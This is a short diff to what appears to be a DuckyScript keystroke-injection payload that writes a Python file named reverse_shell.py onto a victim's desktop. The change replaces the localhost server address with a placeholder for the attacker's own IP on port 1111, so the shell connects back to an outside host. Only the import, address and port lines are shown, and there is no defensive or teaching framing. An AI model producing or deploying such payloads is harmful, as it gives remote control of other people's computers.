@@ -19,7 +19,7 @@ DELAY 500
 STRING echo 'import subprocess' >> ~/Desktop/reverse_shell.py
 ENTER
 DELAY 500
-STRING echo 'server_address = "127.0.0.1"' >> ~/Desktop/reverse_shell.py
+STRING echo 'server_address = "{include your ip address and remove brackets}"' >> ~/Desktop/reverse_shell.py
 ENTER
 DELAY 500
 STRING echo 'server_port = 1111' >> ~/Desktop/reverse_shell.py
